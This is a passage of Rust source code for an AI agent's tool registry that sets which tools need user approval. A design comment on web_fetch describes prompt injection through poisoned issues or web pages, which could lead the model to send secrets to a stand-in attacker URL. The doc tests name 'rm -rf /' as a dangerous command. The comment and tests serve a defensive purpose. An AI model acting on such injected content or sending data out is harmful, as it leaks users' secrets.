            "gh_issue".to_string(),
            ToolDefinition {
                tool: Tool::new("gh_issue", "GitHub issue operations via gh api.").with_schema(
                    serde_json::json!({
                        "type": "object",
                        "properties": {
                            "action": {"type": "string"},
                            "number": {"type": "number"},
                            "title": {"type": "string"},
                            "body": {"type": "string"},
                            "labels": {"type": "array", "items": {"type": "string"}},
                            "state": {"type": "string"},
                            "author": {"type": "string"},
                            "limit": {"type": "number"},
                            "json": {"type": "boolean"},
                            "repository": {"type": "string"}
                        },
                        "required": ["action"]
                    }),
                ),
                requires_approval: true,
            },
        );

        tools.insert(
            "gh_repo".to_string(),
            ToolDefinition {
                tool: Tool::new("gh_repo", "GitHub repository operations via gh api.").with_schema(
                    serde_json::json!({
                        "type": "object",
                        "properties": {
                            "action": {"type": "string"},
                            "repository": {"type": "string"},
                            "directory": {"type": "string"},
                            "json": {"type": "boolean"}
                        },
                        "required": ["action"]
                    }),
                ),
                requires_approval: true,
            },
        );

        // Web fetch tool - retrieve web content.
        //
        // requires_approval: true. This is READ-ONLY for the local
        // filesystem but NOT safe: `web_fetch` performs an HTTP request to
        // an arbitrary, model-chosen URL, which is a live exfiltration
        // channel (`GET https://attacker.tld/?d=<secret>`) whether or not
        // the response body is ever used. Untrusted content ingested by any
        // other tool earlier in the same turn (a poisoned GitHub issue, web
        // page, or search result) can steer the model into issuing exactly
        // this call with no further user interaction. See
        // `agent::protocol::model_content` for the untrusted-content
        // envelope that wraps this tool's *output*; the envelope does not
        // gate the *request*, which is why approval is required here.
        //
        // A per-origin allowlist (auto-approve URLs/hosts already seen this
        // conversation, prompt only for novel origins) was considered and
        // deliberately not built in this change: it needs session-scoped
        // state this stateless, `&self`-only registry does not currently
        // hold, and this exact file already has two other in-flight PRs
        // against it. Blanket approval is coarser (more prompts on
        // multi-fetch research turns) but ships now and is closable in a
        // follow-up without re-litigating the trust taxonomy.
        let webfetch_definition = WebFetchTool::definition();
        tools.insert(
            "web_fetch".to_string(),
            ToolDefinition {
                tool: webfetch_definition.clone(),
                requires_approval: true,
            },
        );
        tools.insert(
            "webfetch".to_string(),
            ToolDefinition {
                tool: Tool::new("webfetch", webfetch_definition.description.clone())
                    .with_schema(webfetch_definition.input_schema.clone()),
                requires_approval: true,
            },
        );

        // Image reading tool - for vision-capable models. Reads a local
        // image file; no network request, so (unlike web_fetch/
        // extract_document above) there is no exfiltration channel here.
        tools.insert(
            "read_image".to_string(),
            ToolDefinition {
                tool: ImageTool::read_image_definition(),
                requires_approval: false, // Safe read-only operation
            },
        );

        // Screenshot capture tool
        tools.insert(
            "screenshot".to_string(),
            ToolDefinition {
                tool: ImageTool::screenshot_definition(),
                requires_approval: true, // Captures screen content - needs approval
            },
        );

        // MCP resource tools
        tools.insert(
            "mcp_list_resources".to_string(),
            ToolDefinition {
                tool: Tool::new("mcp_list_resources", "List available MCP resources.").with_schema(
                    serde_json::json!({
                        "type": "object",
                        "properties": {
                            "server": {"type": "string"}
                        },
                        "required": []
                    }),
                ),
                requires_approval: false,
            },
        );
        tools.insert(
            "mcp_list_prompts".to_string(),
            ToolDefinition {
                tool: Tool::new("mcp_list_prompts", "List available MCP prompts.").with_schema(
                    serde_json::json!({
                        "type": "object",
                        "properties": {
                            "server": {"type": "string"}
                        },
                        "required": []
                    }),
                ),
                requires_approval: false,
            },
        );
        tools.insert(
            "mcp_read_resource".to_string(),
            ToolDefinition {
                tool: Tool::new("mcp_read_resource", "Read an MCP resource by URI.").with_schema(
                    serde_json::json!({
                        "type": "object",
                        "properties": {
                            "server": {"type": "string"},
                            "uri": {"type": "string"}
                        },
                        "required": ["server", "uri"]
                    }),
                ),
                requires_approval: false,
            },
        );
        tools.insert(
            "mcp_get_prompt".to_string(),
            ToolDefinition {
                tool: Tool::new("mcp_get_prompt", "Get an MCP prompt by name.").with_schema(
                    serde_json::json!({
                        "type": "object",
                        "properties": {
                            "server": {"type": "string"},
                            "name": {"type": "string"},
                            "arguments": {
                                "type": "object",
                                "additionalProperties": {"type": "string"}
                            }
                        },
                        "required": ["server", "name"]
                    }),
                ),
                requires_approval: false,
            },
        );

        // IDE tools (LSP-backed)
        let diagnostics_schema = serde_json::json!({
            "type": "object",
            "properties": {
                "uri": {"type": "string"}
            },
            "required": []
        });
        let definition_schema = serde_json::json!({
            "type": "object",
            "properties": {
                "uri": {"type": "string"},
                "line": {"type": "number", "minimum": 0},
                "character": {"type": "number", "minimum": 0}
            },
            "required": ["uri", "line", "character"]
        });
        let references_schema = serde_json::json!({
            "type": "object",
            "properties": {
                "uri": {"type": "string"},
                "line": {"type": "number", "minimum": 0},
                "character": {"type": "number", "minimum": 0}
            },
            "required": ["uri", "line", "character"]
        });
        let read_range_schema = serde_json::json!({
            "type": "object",
            "properties": {
                "uri": {"type": "string"},
                "startLine": {"type": "number", "minimum": 0, "maximum": 10000},
                "endLine": {"type": "number", "minimum": 0, "maximum": 10000}
            },
            "required": ["uri", "startLine", "endLine"]
        });

        tools.insert(
            "vscode_get_diagnostics".to_string(),
            ToolDefinition {
                tool: Tool::new(
                    "vscode_get_diagnostics",
                    "Get diagnostic errors/warnings from the workspace (LSP-backed).",
                )
                .with_schema(diagnostics_schema.clone()),
                requires_approval: false,
            },
        );
        tools.insert(
            "vscode_get_definition".to_string(),
            ToolDefinition {
                tool: Tool::new(
                    "vscode_get_definition",
                    "Go to definition for a symbol at a position (LSP-backed).",
                )
                .with_schema(definition_schema.clone()),
                requires_approval: false,
            },
        );
        tools.insert(
            "vscode_find_references".to_string(),
            ToolDefinition {
                tool: Tool::new(
                    "vscode_find_references",
                    "Find references for a symbol at a position (LSP-backed).",
                )
                .with_schema(references_schema.clone()),
                requires_approval: false,
            },
        );
        tools.insert(
            "vscode_read_file_range".to_string(),
            ToolDefinition {
                tool: Tool::new(
                    "vscode_read_file_range",
                    "Read a specific range of lines from a file (LSP-backed).",
                )
                .with_schema(read_range_schema.clone()),
                requires_approval: false,
            },
        );
        tools.insert(
            "jetbrains_get_diagnostics".to_string(),
            ToolDefinition {
                tool: Tool::new(
                    "jetbrains_get_diagnostics",
                    "Get diagnostic errors/warnings from the workspace (LSP-backed).",
                )
                .with_schema(diagnostics_schema.clone()),
                requires_approval: false,
            },
        );
        tools.insert(
            "jetbrains_get_definition".to_string(),
            ToolDefinition {
                tool: Tool::new(
                    "jetbrains_get_definition",
                    "Go to definition for a symbol at a position (LSP-backed).",
                )
                .with_schema(definition_schema.clone()),
                requires_approval: false,
            },
        );
        tools.insert(
            "jetbrains_find_references".to_string(),
            ToolDefinition {
                tool: Tool::new(
                    "jetbrains_find_references",
                    "Find references for a symbol at a position (LSP-backed).",
                )
                .with_schema(references_schema.clone()),
                requires_approval: false,
            },
        );
        tools.insert(
            "jetbrains_read_file_range".to_string(),
            ToolDefinition {
                tool: Tool::new(
                    "jetbrains_read_file_range",
                    "Read a specific range of lines from a file (LSP-backed).",
                )
                .with_schema(read_range_schema.clone()),
                requires_approval: false,
            },
        );

        Self { tools }
    }

    /// Return missing required fields for a tool based on its JSON schema
    ///
    /// This method validates the provided arguments against the tool's schema and
    /// returns a list of required field names that are either:
    /// - Not present in the args object
    /// - Present but empty (for string fields)
    ///
    /// # Arguments
    ///
    /// - `name`: Tool name (case-insensitive)
    /// - `args`: JSON object containing the proposed arguments
    ///
    /// # Returns
    ///
    /// Vector of field names that are missing or invalid. Empty vector if all
    /// required fields are present and valid.
    ///
    /// # Schema Processing
    ///
    /// 1. Look up tool definition by name (lowercase)
    /// 2. Extract "required" array from tool's `input_schema`
    /// 3. For each required field, check if:
    ///    - Field exists in args
    ///    - Field value is not an empty string (for string types)
    /// 4. Collect missing field names
    ///
    /// # Examples
    ///
    /// ```
    /// use maestro_local_host::tools::ToolRegistry;
    /// use serde_json::json;
    ///
    /// let registry = ToolRegistry::new();
    ///
    /// // Missing command field
    /// let args = json!({});
    /// let missing = registry.missing_required("bash", &args);
    /// assert_eq!(missing, vec!["command"]);
    ///
    /// // Empty command field (treated as missing)
    /// let args = json!({"command": ""});
    /// let missing = registry.missing_required("bash", &args);
    /// assert_eq!(missing, vec!["command"]);
    ///
    /// // All required fields present
    /// let args = json!({"command": "ls -la"});
    /// let missing = registry.missing_required("bash", &args);
    /// assert!(missing.is_empty());
    ///
    /// // Edit tool requires a path (edit params are validated at runtime)
    /// let args = json!({"file_path": "/tmp/file.txt"});
    /// let missing = registry.missing_required("edit", &args);
    /// assert!(missing.is_empty());
    /// ```
    #[must_use]
    pub fn missing_required(&self, name: &str, args: &serde_json::Value) -> Vec<String> {
        let mut missing = Vec::new();
        if let Some(def) = self.get(name) {
            if let Some(required) = def
                .tool
                .input_schema
                .get("required")
                .and_then(|v| v.as_array())
            {
                for field in required.iter().filter_map(|f| f.as_str()) {
                    let present = args.get(field).is_some()
                        && !args
                            .get(field)
                            .and_then(|v| v.as_str())
                            .is_some_and(|s| s.trim().is_empty());
                    let alias_present = match field {
                        "file_path" => args
                            .get("path")
                            .and_then(|v| v.as_str())
                            .is_some_and(|s| !s.trim().is_empty()),
                        "path" => args
                            .get("file_path")
                            .and_then(|v| v.as_str())
                            .is_some_and(|s| !s.trim().is_empty()),
                        _ => false,
                    };
                    if !present && !alias_present {
                        missing.push(field.to_string());
                    }
                }
            }
        }
        missing
    }

    /// Get an iterator over all registered tool definitions
    ///
    /// Returns an iterator that yields immutable references to all `ToolDefinitions`
    /// in the registry. The order is undefined (`HashMap` iteration order).
    ///
    /// # Examples
    ///
    /// ```
    /// use maestro_local_host::tools::ToolRegistry;
    ///
    /// let registry = ToolRegistry::new();
    ///
    /// // Count tools
    /// let count = registry.tools().count();
    /// assert_eq!(count, 69);  // includes repository_symbols and durable subagent control
    ///
    /// // List tool names
    /// for tool_def in registry.tools() {
    ///     println!("Tool: {}", tool_def.tool.name);
    /// }
    /// ```
    pub fn tools(&self) -> impl Iterator<Item = &ToolDefinition> {
        self.tools.values()
    }

    #[cfg(test)]
    pub(crate) fn named_tools(&self) -> impl Iterator<Item = (&str, &ToolDefinition)> {
        self.tools
            .iter()
            .map(|(name, definition)| (name.as_str(), definition))
    }

    /// Get a tool definition by name (case-insensitive lookup)
    ///
    /// # Arguments
    ///
    /// - `name`: Tool name to look up (e.g., "bash", "Bash", "BASH")
    ///
    /// # Returns
    ///
    /// Some(&ToolDefinition) if the tool exists, None otherwise.
    ///
    /// # Examples
    ///
    /// ```
    /// use maestro_local_host::tools::ToolRegistry;
    ///
    /// let registry = ToolRegistry::new();
    ///
    /// // Case-insensitive lookup
    /// assert!(registry.get("bash").is_some());
    /// assert!(registry.get("Bash").is_some());
    /// assert!(registry.get("BASH").is_some());
    ///
    /// // Unknown tool
    /// assert!(registry.get("unknown").is_none());
    /// ```
    #[must_use]
    pub fn get(&self, name: &str) -> Option<&ToolDefinition> {
        self.tools
            .get(name)
            .or_else(|| self.tools.get(&name.to_lowercase()))
    }

    /// Check if a tool requires user approval, considering dynamic logic
    ///
    /// This method implements a two-tier approval system:
    ///
    /// 1. **Dynamic approval (bash only)**: Inspects command content to determine
    ///    if approval is needed. Safe commands like "ls" are auto-approved.
    /// 2. **Static approval**: Uses the `requires_approval` flag from the tool
    ///    definition. Tools like "write" always require approval.
    ///
    /// # Arguments
    ///
    /// - `name`: Tool name (case-insensitive)
    /// - `args`: JSON object containing tool arguments
    ///
    /// # Returns
    ///
    /// - `true`: Tool requires user approval before execution
    /// - `false`: Tool can execute automatically without prompting
    ///
    /// Unknown tools default to requiring approval for safety.
    ///
    /// # Examples
    ///
    /// ```
    /// use maestro_local_host::tools::ToolRegistry;
    /// use serde_json::json;
    ///
    /// let registry = ToolRegistry::new();
    ///
    /// // Read tool - static approval (false)
    /// let args = json!({"file_path": "/etc/passwd"});
    /// assert!(!registry.requires_approval("read", &args));
    ///
    /// // Write tool - static approval (true)
    /// let args = json!({"file_path": "/tmp/test.txt", "content": "hello"});
    /// assert!(registry.requires_approval("write", &args));
    ///
    /// // Bash tool - dynamic approval based on command
    /// let safe_cmd = json!({"command": "git status"});
    /// assert!(!registry.requires_approval("bash", &safe_cmd));
    ///
    /// let unsafe_cmd = json!({"command": "rm -rf /"});
    /// assert!(registry.requires_approval("bash", &unsafe_cmd));
    ///
    /// // Unknown tool - defaults to requiring approval
    /// let args = json!({});
    /// assert!(registry.requires_approval("unknown_tool", &args));
    /// ```
    #[must_use]
    pub fn requires_approval(&self, name: &str, args: &serde_json::Value) -> bool {
        match name {
            "bash" | "Bash" => {
                if let Some(cmd) = args.get("command").and_then(|v| v.as_str()) {
                    BashTool::requires_approval(cmd)
                } else {
                    true
                }
            }
            _ => self.get(name).is_none_or(|d| d.requires_approval),
        }
    }

    /// Register a tool from an external source (e.g., inline tools, MCP)
    ///
    /// This method adds a new tool to the registry. If a tool with the same name
    /// already exists, it will be overwritten.
    ///
    /// # Arguments
    ///
    /// - `name`: Tool name (will be normalized to lowercase)
    /// - `definition`: The tool definition to register
    ///
    /// # Example
    ///
    /// ```
    /// use maestro_local_host::tools::ToolRegistry;
    /// use maestro_local_host::agent::ToolDefinition;
    /// use maestro_local_host::ai::Tool;
    ///
    /// let mut registry = ToolRegistry::new();
    ///
    /// let tool = Tool::new("my_tool", "A custom tool")
    ///     .with_schema(serde_json::json!({
    ///         "type": "object",
    ///         "properties": {},
    ///         "required": []
    ///     }));
    ///
    /// registry.register("my_tool", ToolDefinition {
    ///     tool,
    ///     requires_approval: true,
    /// });
    ///
    /// assert!(registry.get("my_tool").is_some());
    /// ```
    pub fn register(&mut self, name: &str, definition: ToolDefinition) {
        self.tools.insert(name.to_lowercase(), definition);
    }

    /// Register an externally dispatched exact spelling without replacing a
    /// case-folded built-in definition.
    pub(crate) fn register_exact(&mut self, name: &str, definition: ToolDefinition) {
        self.tools.insert(name.to_string(), definition);
    }

    /// Unregister a tool by name
    ///
    /// Returns true if the tool was found and removed, false otherwise.
    pub fn unregister(&mut self, name: &str) -> bool {
        self.tools.remove(&name.to_lowercase()).is_some()
    }
}

impl Default for ToolRegistry {
    fn default() -> Self {
        Self::new()
    }
}
